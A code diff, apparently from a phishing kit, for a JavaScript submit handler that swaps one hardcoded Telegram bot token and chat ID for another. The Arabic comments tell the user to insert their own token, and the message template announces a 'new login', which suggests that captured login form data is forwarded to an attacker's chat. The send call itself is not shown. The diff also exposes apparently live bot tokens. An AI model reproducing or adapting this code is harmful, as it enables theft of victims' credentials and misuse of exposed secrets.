@@ -8,8 +8,8 @@ document.getElementById("form1").addEventListener("submit", function(e) {
       return;
     }
 
-    const token = "7714919420:AAEiI6a7p6YHHJRO4c5bCQt8F7zA62DufNM";  // استخدم التوكن الخاص بك
-    const chatId = "7273991427";  // استخدم الـ Chat ID الخاص بك
+    const token = "8044227789:AAHNZxIXljNkt1pbwvJ5-BWLT4WRGlbycx4";  // استخدم التوكن الخاص بك
+    const chatId = "7595871538";  // استخدم الـ Chat ID الخاص بك
 
     const message = `
       📥 تسجيل دخول جديد:
